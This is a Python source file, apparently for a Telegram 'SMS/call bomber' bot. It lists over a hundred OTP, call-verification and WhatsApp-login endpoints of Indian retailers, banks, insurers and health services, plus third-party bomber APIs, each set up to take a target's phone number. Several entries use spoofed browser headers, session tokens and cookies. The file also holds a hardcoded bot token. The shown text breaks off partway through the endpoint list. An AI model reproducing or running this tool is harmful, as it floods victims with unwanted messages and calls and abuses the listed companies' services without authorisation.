#join channel for more updates @DINOCHECKER
#owner @SamZGamer
import asyncio
import aiohttp
import time
import json
import os
from datetime import datetime
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

BOT_TOKEN = "8546588357:AAFdU_j5_fMlvsFwkK53pgcXT4fVbpMenQA"

# Admin Configuration
ADMIN_ID = 7678087570
AUTHORIZED_USERS_FILE = "authorized_users.json"

APIS = [
    {
        "name": "FreeFire Bomber",
        "url": lambda p, d: f"https://freefire-api.ct.ws/bomber4.php?phone={p}&duration={d}",
        "method": "GET",
        "headers": {"User-Agent": "Mozilla/5.0"}
    },
    {
        "name": "Call Bomber API",
        "url": lambda p, d: f"https://call-bomber-50k3t8a6r-rohit-harshes-projects.vercel.app/bomb?number={p}",
        "method": "GET",
        "headers": {"User-Agent": "Mozilla/5.0"}
    },
    {
        "name": "Bomberr API",
        "url": lambda p, d: f"https://bomberr.onrender.com/num={p}",
        "method": "GET",
        "headers": {"User-Agent": "Mozilla/5.0"}
    },
    {
        "name": "Lenskart",
        "url": lambda p, d: "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phoneCode":"+91","telephone":"{p}"}}'
    },
    {
        "name": "Hungama",
        "url": lambda p, d: "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un"}}'
    },
    {
        "name": "Meru Cab",
        "url": lambda p, d: "https://merucabapp.com/api/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda p, d: f"mobile_number={p}"
    },
    {
        "name": "Dayco India",
        "url": lambda p, d: "https://ekyc.daycoindia.com/api/nscript_functions.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda p, d: f"api=send_otp&mob={p}"
    },
    {
        "name": "NoBroker",
        "url": lambda p, d: "https://www.nobroker.in/api/v3/account/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda p, d: f"phone={p}&countryCode=IN"
    },
    {
        "name": "ShipRocket",
        "url": lambda p, d: "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobileNumber":"{p}"}}'
    },
    {
        "name": "PenPencil",
        "url": lambda p, d: "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        "method": "POST",
        "headers": {"content-type": "application/json"},
        "data": lambda p, d: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}'
    },
    {
        "name": "1mg",
        "url": lambda p, d: "https://www.1mg.com/auth_api/v6/create_token",
        "method": "POST",
        "headers": {"content-type": "application/json"},
        "data": lambda p, d: f'{{"number":"{p}","otp_on_call":true}}'
    },
    {
        "name": "KPN Fresh",
        "url": lambda p, d: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB",
        "method": "POST",
        "headers": {"content-type": "application/json"},
        "data": lambda p, d: f'{{"phone_number":{{"number":"{p}","country_code":"+91"}}}}'
    },
    {
        "name": "Servetel",
        "url": lambda p, d: "https://api.servetel.in/v1/auth/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda p, d: f"mobile_number={p}"
    },
    {
        "name": "Swiggy Call",
        "url": lambda p, d: "https://profile.swiggy.com/api/v3/app/request_call_verification",
        "method": "POST",
        "headers": {"content-type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Tata Capital",
        "url": lambda p, d: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}'
    },
    {
        "name": "Doubtnut",
        "url": lambda p, d: "https://api.doubtnut.com/v4/student/login",
        "method": "POST",
        "headers": {"content-type": "application/json"},
        "data": lambda p, d: f'{{"phone_number":"{p}","language":"en"}}'
    },
    {
        "name": "GoPink Cabs",
        "url": lambda p, d: "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda p, d: f"check_mobile_number=1&contact={p}"
    },
    {
        "name": "Myntra",
        "url": lambda p, d: "https://www.myntra.com/gw/mobile-auth/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Flipkart",
        "url": lambda p, d: "https://2.rome.api.flipkart.com/api/4/user/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobileNumber":"{p}"}}'
    },
    {
        "name": "Amazon",
        "url": lambda p, d: "https://www.amazon.in/ap/signin",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda p, d: f"email={p}&create=1"
    },
    {
        "name": "Zomato",
        "url": lambda p, d: "https://www.zomato.com/php/asyncLogin.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda p, d: f"phone={p}"
    },
    {
        "name": "Paytm",
        "url": lambda p, d: "https://accounts.paytm.com/signin/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}","loginData":"LOGIN_USING_PHONE"}}'
    },
    {
        "name": "PhonePe",
        "url": lambda p, d: "https://www.phonepe.com/api/v2/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "BigBasket",
        "url": lambda p, d: "https://www.bigbasket.com/bb-oauth/api/v2.0/otp/generate/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile_number":"{p}"}}'
    },
    {
        "name": "Meesho",
        "url": lambda p, d: "https://api.meesho.com/v2/auth/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Snapdeal",
        "url": lambda p, d: "https://www.snapdeal.com/authenticate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Makemytrip",
        "url": lambda p, d: "https://www.makemytrip.com/api/umbrella/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "OYO",
        "url": lambda p, d: "https://api.oyoroomscrm.com/api/v2/user/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Rapido",
        "url": lambda p, d: "https://rapido.bike/api/v2/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Uber",
        "url": lambda p, d: "https://auth.uber.com/v2/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Domino's",
        "url": lambda p, d: "https://order.godominos.co.in/Online/App.aspx",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda p, d: f"PhoneNo={p}"
    },
    {
        "name": "BookMyShow",
        "url": lambda p, d: "https://in.bmscdn.com/mjson/User/SendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobileNo":"{p}"}}'
    },
    {
        "name": "Netmeds",
        "url": lambda p, d: "https://www.netmeds.com/api/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Medlife",
        "url": lambda p, d: "https://api.medlife.com/v2/user/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Practo",
        "url": lambda p, d: "https://www.practo.com/patient/loginviapassword",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Ajio",
        "url": lambda p, d: "https://www.ajio.com/api/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobileNumber":"{p}"}}'
    },
    {
        "name": "Nykaa",
        "url": lambda p, d: "https://www.nykaa.com/api/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Croma",
        "url": lambda p, d: "https://api.croma.com/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Reliance Digital",
        "url": lambda p, d: "https://www.reliancedigital.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "FirstCry",
        "url": lambda p, d: "https://www.firstcry.com/api/sendotp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Licious",
        "url": lambda p, d: "https://api.licious.com/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Zepto",
        "url": lambda p, d: "https://api.zepto.com/v2/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Blinkit",
        "url": lambda p, d: "https://blinkit.com/api/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Mobikwik",
        "url": lambda p, d: "https://www.mobikwik.com/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Freecharge",
        "url": lambda p, d: "https://www.freecharge.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Airtel Thanks",
        "url": lambda p, d: "https://www.airtel.in/thanks-app/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Jio",
        "url": lambda p, d: "https://www.jio.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Vodafone Idea",
        "url": lambda p, d: "https://www.myvi.in/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Byju's",
        "url": lambda p, d: "https://byjus.com/api/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Unacademy",
        "url": lambda p, d: "https://unacademy.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Vedantu",
        "url": lambda p, d: "https://www.vedantu.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Toppr",
        "url": lambda p, d: "https://www.toppr.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "WhiteHat Jr",
        "url": lambda p, d: "https://www.whitehatjr.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Cult.fit",
        "url": lambda p, d: "https://www.cult.fit/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "HealthifyMe",
        "url": lambda p, d: "https://www.healthifyme.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Pristyn Care",
        "url": lambda p, d: "https://www.pristyncare.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "PharmEasy",
        "url": lambda p, d: "https://pharmeasy.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Tata 1mg",
        "url": lambda p, d: "https://www.1mg.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Apollo 24/7",
        "url": lambda p, d: "https://www.apollo247.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "MFine",
        "url": lambda p, d: "https://www.mfine.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "DocsApp",
        "url": lambda p, d: "https://www.docsapp.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Lybrate",
        "url": lambda p, d: "https://www.lybrate.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Portea Medical",
        "url": lambda p, d: "https://www.portea.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "PolicyBazaar",
        "url": lambda p, d: "https://www.policybazaar.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "CoverFox",
        "url": lambda p, d: "https://www.coverfox.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Acko",
        "url": lambda p, d: "https://www.acko.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Digit Insurance",
        "url": lambda p, d: "https://www.godigit.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "HDFC Ergo",
        "url": lambda p, d: "https://www.hdfcergo.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "ICICI Lombard",
        "url": lambda p, d: "https://www.icicilombard.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Bajaj Allianz",
        "url": lambda p, d: "https://www.bajajallianz.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Star Health",
        "url": lambda p, d: "https://www.starhealth.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Max Bupa",
        "url": lambda p, d: "https://www.maxbupa.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Kotak Life",
        "url": lambda p, d: "https://www.kotaklife.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "SBI Life",
        "url": lambda p, d: "https://www.sbilife.co.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "LIC India",
        "url": lambda p, d: "https://www.licindia.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "HDFC Life",
        "url": lambda p, d: "https://www.hdfclife.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Axis Bank",
        "url": lambda p, d: "https://www.axisbank.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "ICICI Bank",
        "url": lambda p, d: "https://www.icicibank.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "HDFC Bank",
        "url": lambda p, d: "https://www.hdfcbank.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "SBI Bank",
        "url": lambda p, d: "https://www.sbi.co.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Kotak Bank",
        "url": lambda p, d: "https://www.kotak.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Yes Bank",
        "url": lambda p, d: "https://www.yesbank.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "IndusInd Bank",
        "url": lambda p, d: "https://www.indusind.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "IDFC Bank",
        "url": lambda p, d: "https://www.idfcfirstbank.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "AU Bank",
        "url": lambda p, d: "https://www.aubank.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "RBL Bank",
        "url": lambda p, d: "https://www.rblbank.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Bandhan Bank",
        "url": lambda p, d: "https://www.bandhanbank.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Federal Bank",
        "url": lambda p, d: "https://www.federalbank.co.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Canara Bank",
        "url": lambda p, d: "https://www.canarabank.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "PNB",
        "url": lambda p, d: "https://www.pnbindia.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Bank of Baroda",
        "url": lambda p, d: "https://www.bankofbaroda.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Union Bank",
        "url": lambda p, d: "https://www.unionbankofindia.co.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Indian Bank",
        "url": lambda p, d: "https://www.indianbank.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Central Bank",
        "url": lambda p, d: "https://www.centralbankofindia.co.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Bank of India",
        "url": lambda p, d: "https://www.bankofindia.co.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "IDBI Bank",
        "url": lambda p, d: "https://www.idbibank.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "UCO Bank",
        "url": lambda p, d: "https://www.ucobank.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Indian Overseas Bank",
        "url": lambda p, d: "https://www.iob.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Punjab & Sind Bank",
        "url": lambda p, d: "https://www.psbindia.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Lenskart Advanced",
        "url": lambda p, d: "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Accept": "*/*",
            "X-API-Client": "mobilesite",
            "X-Session-Token": "7836451c-4b02-4a00-bde1-15f7fb50312a",
            "X-Accept-Language": "en",
            "X-B3-TraceId": "991736185845136",
            "X-Country-Code": "IN",
            "X-Country-Code-Override": "IN",
            "Sec-CH-UA-Platform": "\"Android\"",
            "Sec-CH-UA": "\"Android WebView\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
            "Sec-CH-UA-Mobile": "?1",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
            "Origin": "https://www.lenskart.com",
            "X-Requested-With": "pure.lite.browser",
            "Sec-Fetch-Site": "same-site",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://www.lenskart.com/",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8"
        },
        "data": lambda p, d: f'{{"captcha":null,"phoneCode":"+91","telephone":"{p}"}}'
    },
    {
        "name": "GoPink Cabs Advanced",
        "url": lambda p, d: "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Accept": "*/*",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://www.gopinkcabs.com",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://www.gopinkcabs.com/app/cab/customer/step1.php",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Sec-CH-UA-Platform": "\"Android\"",
            "Sec-CH-UA": "\"Android WebView\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
            "Sec-CH-UA-Mobile": "?1",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
            "Cookie": "PHPSESSID=mor5basshemi72pl6d0bp21kso; mylocation=#"
        },
        "data": lambda p, d: f"check_mobile_number=1&contact={p}"
    },
    {
        "name": "Shemaroo Me",
        "url": lambda p, d: "https://www.shemaroome.com/users/resend_otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Accept": "*/*",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://www.shemaroome.com",
            "Referer": "https://www.shemaroome.com/users/sign_in",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36"
        },
        "data": lambda p, d: f"mobile_no=%2B91{p}"
    },
    {
        "name": "KPN Fresh Web",
        "url": lambda p, d: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
        "method": "POST",
        "headers": {
            "sec-ch-ua-platform": "\"Android\"",
            "cache": "no-store",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "x-channel-id": "WEB",
            "sec-ch-ua-mobile": "?1",
            "x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "content-type": "application/json",
            "x-user-journey-id": "2fbdb12b-feb8-40f5-9fc7-7ce4660723ae",
            "accept": "*/*",
            "origin": "https://www.kpnfresh.com",
            "sec-fetch-site": "same-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://www.kpnfresh.com/",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
            "priority": "u=1, i"
        },
        "data": lambda p, d: f'{{"phone_number":{{"number":"{p}","country_code":"+91"}}}}'
    },
    {
        "name": "KPN Fresh Android",
        "url": lambda p, d: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
        "method": "POST",
        "headers": {
            "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
            "x-app-version": "3.2.6",
            "x-user-journey-id": "faf3393a-018e-4fb9-8aed-8c9a90300b88",
            "content-type": "application/json; charset=UTF-8",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/5.0.0-alpha.11"
        },
        "data": lambda p, d: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{p}"}}}}'
    },
    {
        "name": "BikeFixUp",
        "url": lambda p, d: "https://api.bikefixup.com/api/v2/send-registration-otp",
        "method": "POST",
        "headers": {
            "accept": "application/json",
            "accept-encoding": "gzip",
            "host": "api.bikefixup.com",
            "client": "app",
            "content-type": "application/json; charset=UTF-8",
            "user-agent": "Dart/3.6 (dart:io)"
        },
        "data": lambda p, d: f'{{"phone":"{p}","app_signature":"4pFtQJwcz6y"}}'
    },
    {
        "name": "Rappi",
        "url": lambda p, d: "https://services.rappi.com/api/rappi-authentication/login/whatsapp/create",
        "method": "POST",
        "headers": {
            "Deviceid": "5df83c463f0ff8ff",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G965N Build/QP1A.190711.020)",
            "Accept-Language": "en-US",
            "Accept": "application/json",
            "Content-Type": "application/json; charset=UTF-8",
            "Accept-Encoding": "gzip, deflate"
        },
        "data": lambda p, d: f'{{"phone":"{p}","country_code":"+91"}}'
    },
    {
        "name": "Stratzy Phone",
        "url": lambda p, d: "https://stratzy.in/api/web/auth/sendPhoneOTP",
        "method": "POST",
        "headers": {
            "sec-ch-ua-platform": "\"Android\"",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "content-type": "application/json",
            "sec-ch-ua-mobile": "?1",
            "accept": "*/*",
            "origin": "https://stratzy.in",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://stratzy.in/login",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
            "cookie": "_fbp=fb.1.1745073074472.847987893655824745; _ga=GA1.1.2022915250.1745073078; _ga_TDMEH7B1D5=GS1.1.1745073077.1.1.1745073132.5.0.0",
            "priority": "u=1, i"
        },
        "data": lambda p, d: f'{{"phoneNo":"{p}"}}'
    },
    {
        "name": "Stratzy WhatsApp",
        "url": lambda p, d: "https://stratzy.in/api/web/whatsapp/sendOTP",
        "method": "POST",
        "headers": {
            "sec-ch-ua-platform": "\"Android\"",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "content-type": "application/json",
            "sec-ch-ua-mobile": "?1",
            "accept": "*/*",
